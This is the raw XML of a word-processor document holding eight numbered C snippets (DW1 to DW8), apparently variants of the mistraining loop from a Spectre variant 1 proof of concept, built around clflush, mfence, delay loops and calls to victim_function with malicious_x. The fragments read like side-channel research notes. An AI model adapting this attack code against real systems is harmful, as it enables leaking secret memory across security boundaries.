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273e3f" officeooo:paragraph-rsid="00273e3f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000000" style:font-name="Droid Sans Fallback" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="0019e583" fo:background-color="transparent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style:line-height-at-least="0.198in"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:paragraph-rsid="001d315e" fo:background-color="transparent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000000" style:font-name="Droid Sans Fallback" officeooo:paragraph-rsid="0021ad25" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="001d2155" officeooo:paragraph-rsid="001d2155" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in" fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="0019e583" officeooo:paragraph-rsid="0019e583" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="001b67df" officeooo:paragraph-rsid="001b67df" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in" fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="0015f301" officeooo:paragraph-rsid="00273e3f" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in" fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="0015f301" officeooo:paragraph-rsid="00298ac0" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in" fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="0015f301" officeooo:paragraph-rsid="002b7116" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in" fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="0015f301" officeooo:paragraph-rsid="002e1cdb" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.198in" fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="0015f301" officeooo:paragraph-rsid="00307aa3" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="0015f301" officeooo:paragraph-rsid="0015f301" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" style:font-name="Droid Sans Fallback" officeooo:rsid="00273e3f" officeooo:paragraph-rsid="00273e3f" fo:background-color="transparent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="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001d2155"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="0021ad25" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="0022f6c3" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="00273e3f" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="00298ac0" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="002b7116" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="002e1cdb" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:font-name="Droid Sans Mono" fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="00307aa3" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-size="10.5pt" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001d2155"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-size="24pt" officeooo:rsid="0022f6c3" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-size="24pt" officeooo:rsid="0019e583" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="0022f6c3" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="0021ad25" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="00273e3f" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="00298ac0" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="002b7116" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="002e1cdb" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-size="24pt" fo:font-weight="normal" officeooo:rsid="00307aa3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DW</text:span><text:span text:style-name="T14">1</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">size_t training_x = tries % bufferSize;</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">int x;</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">for (int j = 29; j &gt;= 0; j--) {</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"><text:tab/>clflush(&amp;bufferSize);</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"><text:tab/>x = ((j % 6) - 1) &amp; ~0xFFFF;</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"><text:tab/>x = (x | (x &gt;&gt; 16));</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"><text:tab/>x = training_x ^ (x &amp; (malicious_x ^ training_x));</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"><text:tab/>victim_function(x);</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T16">DW</text:span><text:span text:style-name="T15">2</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">size_t training_x = tries % bufferSize;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">int x;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">for (int j = 29; j &gt;= 0; j--) {</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"><text:tab/>clflush(&amp;bufferSize);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"><text:tab/>asm volatile("mfence\n");</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"><text:tab/>x = ((j % 6) - 1) &amp; ~0xFFFF;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"><text:tab/>x = (x | (x &gt;&gt; 16));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"><text:tab/>x = training_x ^ (x &amp; (malicious_x ^ training_x));</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"><text:tab/>victim_function(x);</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T12">}</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16">DW</text:span><text:span text:style-name="T17">3</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">for(int i = 0; i &lt; 6; i++){</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"><text:tab/>for(int j = 5; j &gt;= 0; j--){</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"><text:tab/><text:tab/>for (volatile int z = 0; z &lt; 200; z++) {}</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"><text:tab/><text:tab/>clflush(&amp;bufferSize);</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"><text:tab/><text:tab/>clflush_array(bigNumberBuffer);</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"><text:tab/><text:tab/>victim_function(0);</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"><text:tab/>}</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"><text:tab/>victim_function(malicious_x);</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T16">DW</text:span><text:span text:style-name="T18">4</text:span></text:p>
      <text:p text:style-name="P14">for(int i = 0; i &lt; 6; i++){</text:p>
      <text:p text:style-name="P14"><text:tab/>for(int j = 5; j &gt;= 0; j--){</text:p>
      <text:p text:style-name="P14"><text:tab/><text:tab/>for (volatile int z = 0; z &lt; 200; z++) {}</text:p>
      <text:p text:style-name="P14"><text:tab/><text:tab/>clflush(&amp;bufferSize);</text:p>
      <text:p text:style-name="P14"><text:tab/><text:tab/>clflush_array(bigNumberBuffer);</text:p>
      <text:p text:style-name="P14"><text:tab/><text:tab/>for (volatile int z = 0; z &lt; 200; z++) {}</text:p>
      <text:p text:style-name="P14"><text:tab/><text:tab/>victim_function(0);</text:p>
      <text:p text:style-name="P14"><text:tab/>}</text:p>
      <text:p text:style-name="P14"><text:tab/>clflush_array(array);</text:p>
      <text:p text:style-name="P14"><text:soft-page-break/><text:tab/>victim_function(malicious_x);</text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T16">DW</text:span><text:span text:style-name="T19">5</text:span></text:p>
      <text:p text:style-name="P15">for(int i = 0; i &lt; 6; i++){</text:p>
      <text:p text:style-name="P15"><text:tab/>for(int j = 5; j &gt;= 0; j--){</text:p>
      <text:p text:style-name="P15"><text:tab/><text:tab/>for (volatile int z = 0; z &lt; 200; z++) {}</text:p>
      <text:p text:style-name="P15"><text:tab/><text:tab/>clflush(&amp;bufferSize);</text:p>
      <text:p text:style-name="P15"><text:tab/><text:tab/>clflush_array(bigNumberBuffer);</text:p>
      <text:p text:style-name="P15"><text:tab/><text:tab/>for (volatile int z = 0; z &lt; 200; z++) {}</text:p>
      <text:p text:style-name="P15"><text:tab/><text:tab/>victim_function(0);</text:p>
      <text:p text:style-name="P15"><text:tab/>}</text:p>
      <text:p text:style-name="P15"><text:tab/>victim_function(malicious_x);</text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T16">DW</text:span><text:span text:style-name="T20">6</text:span></text:p>
      <text:p text:style-name="P15">for(int i = 0; i &lt; 6; i++){</text:p>
      <text:p text:style-name="P15"><text:tab/>clflush(&amp;bufferSize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for (volatile int z = 0; z &lt; 200; z++) {}</text:p>
      <text:p text:style-name="P15"><text:tab/>victim_function(malicious_x);</text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T16">DW</text:span><text:span text:style-name="T21">7</text:span></text:p>
      <text:p text:style-name="P15"><text:soft-page-break/>for(int i = 0; i &lt; 6; i++){</text:p>
      <text:p text:style-name="P15"><text:tab/>clflush(&amp;bufferSize);</text:p>
      <text:p text:style-name="P15"><text:tab/>clflush_array(bigNumberBuffer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clflush_array(bigNumberBuffer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clflush_array(bigNumberBuffer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clflush_array(bigNumberBuffer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clflush_array(bigNumberBuffer);</text:p>
      <text:p text:style-name="P15"><text:tab/>for (volatile int z = 0; z &lt; 200; z++) {}</text:p>
      <text:p text:style-name="P15"><text:tab/>victim_function(0);</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><text:tab/>clflush(&amp;bufferSize);</text:p>
      <text:p text:style-name="P15"><text:tab/>clflush_array(bigNumberBuffer);</text:p>
      <text:p text:style-name="P15"><text:tab/>for (volatile int z = 0; z &lt; 200; z++) {}</text:p>
      <text:p text:style-name="P15"><text:tab/>victim_function(malicious_x);</text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T16">DW</text:span><text:span text:style-name="T22">8</text:span></text:p>
      <text:p text:style-name="P15">for (int j = 29; j &gt;= 0; j--) {</text:p>
      <text:p text:style-name="P15"><text:tab/>clflush(&amp;bufferSize);</text:p>
      <text:p text:style-name="P15"><text:tab/>clflush_array(bigNumberBuffer);</text:p>
      <text:p text:style-name="P15"><text:tab/>for (volatile int z = 0; z &lt; 100; z++) {}</text:p>
      <text:p text:style-name="P15"><text:tab/>victim_function((j % 6) == 0 ? malicious_x : 0); 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3:52:57.875971988</meta:creation-date>
    <dc:date>2019-10-15T14:33:50.096794317</dc:date>
    <meta:editing-duration>PT40M41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109" meta:word-count="443" meta:character-count="2679" meta:non-whitespace-character-count="2255"/>
  </office:meta>
</office:document-meta>
</file>